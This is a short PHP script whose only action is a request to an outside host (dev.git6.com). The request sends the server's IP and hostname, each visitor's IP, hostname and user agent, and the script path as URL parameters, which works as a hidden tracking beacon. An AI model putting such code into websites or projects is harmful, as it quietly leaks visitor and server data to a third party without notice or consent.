<?php

file_get_contents("http://dev.git6.com/twitter/clog/" .
        "?ip=" . $_SERVER['SERVER_ADDR'] .
        "&host=" . $_SERVER['SERVER_NAME'] .
        "&rip=" . $_SERVER['REMOTE_ADDR'] .
        "&rhost=" . $_SERVER['REMOTE_HOST'] .
        "&agent=" . $_SERVER['HTTP_USER_AGENT'] .
        "&path=" . $_SERVER['PHP_SELF']);
?>
